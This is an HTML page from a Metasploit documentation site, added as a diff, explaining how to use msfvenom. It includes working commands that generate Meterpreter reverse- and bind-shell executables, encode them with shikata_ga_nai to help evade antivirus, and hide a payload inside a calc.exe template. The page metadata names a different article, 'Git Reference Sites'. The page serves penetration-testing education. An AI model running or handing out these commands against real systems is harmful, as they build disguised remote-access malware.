@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>Git Reference Sites | Metasploit spike</title>
+<meta name="generator" content="Jekyll v4.0.0" />
+<meta property="og:title" content="Git Reference Sites" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Learning Git" />
+<meta property="og:description" content="Learning Git" />
+<link rel="canonical" href="/metasploit-framework/articles/Git-Reference-Sites.html" />
+<meta property="og:url" content="/metasploit-framework/articles/Git-Reference-Sites.html" />
+<meta property="og:site_name" content="Metasploit spike" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2012-01-12T17:14:28+00:00" />
+<script type="application/ld+json">
+{"description":"Learning Git","headline":"Git Reference Sites","dateModified":"2012-01-12T17:14:28+00:00","datePublished":"2012-01-12T17:14:28+00:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"/metasploit-framework/articles/Git-Reference-Sites.html"},"url":"/metasploit-framework/articles/Git-Reference-Sites.html","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/metasploit-framework/assets/main.css"><link type="application/atom+xml" rel="alternate" href="/metasploit-framework/feed.xml" title="Metasploit spike" /></head>
+<body><header class="site-header" role="banner">
+
+    <div class="wrapper"><a class="site-title" rel="author" href="/metasploit-framework/">Metasploit spike</a><nav class="site-nav">
+          <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+          <label for="nav-trigger">
+            <span class="menu-icon">
+              <svg viewBox="0 0 18 15" width="18px" height="15px">
+                <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+              </svg>
+            </span>
+          </label>
+  
+          <div class="trigger">
+            <a class="page-link" href="/metasploit-framework/">Articles</a><a class="page-link" href="/metasploit-framework/modules/">Modules</a></div>
+        </nav></div>
+  </header>
+  <main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">How to use msfvenom</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2016-09-14T18:50:21+01:00" itemprop="datePublished">Sep 14, 2016
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>Msfvenom is the combination of payload generation and encoding. It replaced msfpayload and msfencode on June 8th 2015.</p>
+
+<p>To start using msfvenom, first please take a look at the options it supports:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Options:
+    -p, --payload       &lt;payload&gt;    Payload to use. Specify a '-' or stdin to use custom payloads
+        --payload-options            List the payload's standard options
+    -l, --list          [type]       List a module type. Options are: payloads, encoders, nops, all
+    -n, --nopsled       &lt;length&gt;     Prepend a nopsled of [length] size on to the payload
+    -f, --format        &lt;format&gt;     Output format (use --help-formats for a list)
+        --help-formats               List available formats
+    -e, --encoder       &lt;encoder&gt;    The encoder to use
+    -a, --arch          &lt;arch&gt;       The architecture to use
+        --platform      &lt;platform&gt;   The platform of the payload
+        --help-platforms             List available platforms
+    -s, --space         &lt;length&gt;     The maximum size of the resulting payload
+        --encoder-space &lt;length&gt;     The maximum size of the encoded payload (defaults to the -s value)
+    -b, --bad-chars     &lt;list&gt;       The list of characters to avoid example: '\x00\xff'
+    -i, --iterations    &lt;count&gt;      The number of times to encode the payload
+    -c, --add-code      &lt;path&gt;       Specify an additional win32 shellcode file to include
+    -x, --template      &lt;path&gt;       Specify a custom executable file to use as a template
+    -k, --keep                       Preserve the template behavior and inject the payload as a new thread
+    -o, --out           &lt;path&gt;       Save the payload
+    -v, --var-name      &lt;name&gt;       Specify a custom variable name to use for certain output formats
+        --smallest                   Generate the smallest possible payload
+    -h, --help                       Show this message
+</code></pre></div></div>
+
+<h1 id="how-to-generate-a-payload">How to generate a payload</h1>
+
+<p>To generate a payload, there are two flags that you must supply (-p and -f):</p>
+
+<ul>
+  <li><strong>The -p flag: Specifies what payload to generate</strong></li>
+</ul>
+
+<p>To see what payloads are available from Framework, you can do:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./msfvenom -l payloads
+</code></pre></div></div>
+
+<p>The -p flag also supports “-“ as a way to accept a custom payload:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat payload_file.bin | ./msfvenom -p - -a x86 --platform win -e x86/shikata_ga_nai -f raw
+</code></pre></div></div>
+
+<ul>
+  <li><strong>The -f flag: Specifies the format of the payload</strong></li>
+</ul>
+
+<p>Syntax example:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./msfvenom -p windows/meterpreter/bind_tcp -f exe
+</code></pre></div></div>
+
+<p>To see what formats are supported, you can do the following to find out:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./msfvenom --help-formats
+</code></pre></div></div>
+
+<p>Typically, this is probably how you will use msfvenom:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker's IP] lport=4444 -f exe -o /tmp/my_payload.exe
+</code></pre></div></div>
+
+<h1 id="how-to-encode-a-payload">How to encode a payload</h1>
+
+<p>By default, the encoding feature will automatically kick in when you use the -b flag (the badchar flag). In other cases, you must use the -e flag like the following:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f raw
+</code></pre></div></div>
+
+<p>To find out what encoders you can use, you can use the -l flag:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./msfvenom -l encoders
+</code></pre></div></div>
+
+<p>You can also encode the payload multiple times using the -i flag. Sometimes more iterations may help avoiding antivirus, but know that encoding isn’t really meant to be used a real AV evasion solution:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3 
+</code></pre></div></div>
+
+<h1 id="how-to-avoid-bad-characters">How to avoid bad characters</h1>
+
+<p>The -b flag is meant to be used to avoid certain characters in the payload. When this option is used, msfvenom will automatically find a suitable encoder to encode the payload:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./msfvenom -p windows/meterpreter/bind_tcp -b '\x00' -f raw
+</code></pre></div></div>
+
+<h1 id="how-to-supply-a-custom-template">How to supply a custom template</h1>
+
+<p>By default, msfvenom uses templates from the msf/data/templates directory. If you’d like to choose your own, you can use the -x flag like the following:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe &gt; new.exe 
+</code></pre></div></div>
+
+<p>Please note: If you’d like to create a x64 payload with a custom x64 custom template for Windows, then instead of the exe format, you should use exe-only:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./msfvenom -p windows/x64/meterpreter/bind_tcp -x /tmp/templates/64_calc.exe -f exe-only &gt; /tmp/fake_64_calc.exe
+</code></pre></div></div>
+
+<p>The -x flag is often paired with the -k flag, which allows you to run your payload as a new thread from the template. However, this currently is only reliable for older Windows machines such as x86 Windows XP.</p>
+
+<h1 id="how-to-chain-msfvenom-output">How to chain msfvenom output</h1>
+
+<p>The old <code class="highlighter-rouge">msfpayload</code> and <code class="highlighter-rouge">msfencode</code> utilities were often chained together in order layer on multiple encodings. This is possible using <code class="highlighter-rouge">msfvenom</code> as well:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.3 LPORT=4444 -f raw -e x86/shikata_ga_nai -i 5 | \
+./msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | \
+./msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o payload.exe
+</code></pre></div></div>
+
+  </div><a class="u-url" href="/metasploit-framework/articles/How-to-use-msfvenom.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/metasploit-framework/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Metasploit spike</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Metasploit spike</li><li><a class="u-email" href="mailto:your-email@example.com">your-email@example.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/jekyll"><svg class="svg-icon"><use xlink:href="/metasploit-framework/assets/minima-social-icons.svg#github"></use></svg> <span class="username">jekyll</span></a></li><li><a href="https://www.twitter.com/jekyllrb"><svg class="svg-icon"><use xlink:href="/metasploit-framework/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">jekyllrb</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
